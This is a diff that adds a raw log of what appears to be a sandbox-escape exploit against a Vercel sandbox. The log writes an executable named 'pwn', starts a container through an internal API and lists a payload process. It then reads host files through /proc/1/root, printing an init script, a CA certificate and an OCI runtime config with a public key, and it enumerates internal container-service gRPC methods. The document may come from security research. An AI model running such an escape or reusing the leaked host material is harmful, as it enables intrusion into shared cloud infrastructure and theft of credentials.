@@ -1,0 +1,20 @@
+=== 1 write pwn ===
+pwn written +x size=1128
+host sees pwn: True
+=== 2 create ===
+Create pwn -> HTTP/1.1 200 OK b'{"containerId":"bcac3730-4d7f-48e8-a1f4-640ed62d2493"}'
+cid=bcac3730-4d7f-48e8-a1f4-640ed62d2493
+Start -> HTTP/1.1 200 OK b'{}'
+=== 3 poll ===
+--- pwn out +1281 ---
+poll end seen_len=1281
+=== 4 proc ===
+P 618: python3 /vercel/sandbox/vda177_guest.py 
+P 676: /usr/bin/python3 /vercel/sandbox/v177_payload.py 
+=== 5 host files ===
+FILE /proc/1/root/opt/vercel/celld-init.sh (1295) b'#!/bin/bash\n\nexec 9>/dev/kmsg\nprintf \'<6>hive.celld-init.start\\n\' >&9\nmount -t proc none /proc\nmount -t sysfs none /sys\nmount -t cgroup2 none /sys/fs/cgroup\nprintf \'<6>hive.celld-init.mounts-end\\n\' >&9\n\nexport PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\n\n# convert symlink to real file to handle issues like #
+FILE /proc/1/root/var/run/cell/ca-cert.pem (639) b'-----BEGIN CERTIFICATE-----\nMIIBqjCCAVCgAwIBAgIRAOVcIHD03wsCRHaKtObemMUwCgYIKoZIzj0EAwIwMzEP\nMA0GA1UEChMGVmVyY2VsMSAwHgYDVQQDExdWZXJjZWwgTmV0d29yayBQcm94eSBD\nQTAeFw0yNjA5MDEwMTQ4NTNaFw0yNjA5MDIwMjA4NTNaMDMxDzANBgNVBAoTBlZl\ncmNlbDEgMB4GA1UEAxMXVmVyY2VsIE5ldHdvcmsgUHJveHkgQ0EwWTATBgcqhkjO\nPQIBBggqhkjOPQMBBwNCAAR1+ZtnIantxy03MznK2NgI1brtl0E3xfN5
+RUNCCFG 2488f881-ee25-4998-894c-9e7470ea3675 (10115) b'{\n  "ociVersion": "1.2.0",\n  "process": {\n    "user": {\n      "uid": 1000,\n      "gid": 1000\n    },\n    "args": [\n      "/run/vercel/share/sandbox-init",\n      "--socket=/run/vercel/share/init.sock",\n      "--pubkey=+CebbIw5yt7dhKerUm9Xi2I2f7/Fp9vEejyhW66P3lk="\n    ],\n    "env": [\n      "PATH=/vercel/runtimes/node22/bin:/home/verc
+=== 6 methods ===
+METHODS(8): vercel.hive.cell.api.containers.v1.ContainersService/Exec vercel.hive.cell.api.containers.v1.ContainersService/Wait vercel.hive.cell.api.containers.v1.ContainersService/KillServer vercel.hive.cell.api.containers.v1.ContainersService/Start vercel.hive.cell.api.containers.v1.ContainersService/Stdin vercel.hive.cell.api.containers.v1.ContainersService/MountNo vercel.hive.cell.api.containe
+V177_DONE
